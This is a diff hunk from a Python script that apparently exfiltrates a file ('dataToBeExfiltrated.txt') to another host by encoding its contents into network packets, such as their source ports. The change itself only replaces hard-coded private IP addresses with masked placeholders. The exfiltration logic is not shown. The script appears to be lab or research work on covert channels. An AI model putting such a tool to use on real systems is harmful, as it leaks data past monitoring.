@@ -59,8 +59,8 @@ def send_packet(source_IP, dst_IP, src_port, dst_port=5433):
 
 def main():
     #creates the list of source ports to send
-    sourceIP = "192.168.30.128"
-    destinationIP = "192.168.30.129"
+    sourceIP = "192.168.xx.xxx"
+    destinationIP = "192.168.xx.xxx"
     file_to_be_exfiltrated = "dataToBeExfiltrated.txt"
     list_of_decimal = file_to_decimal(file_to_be_exfiltrated)
 
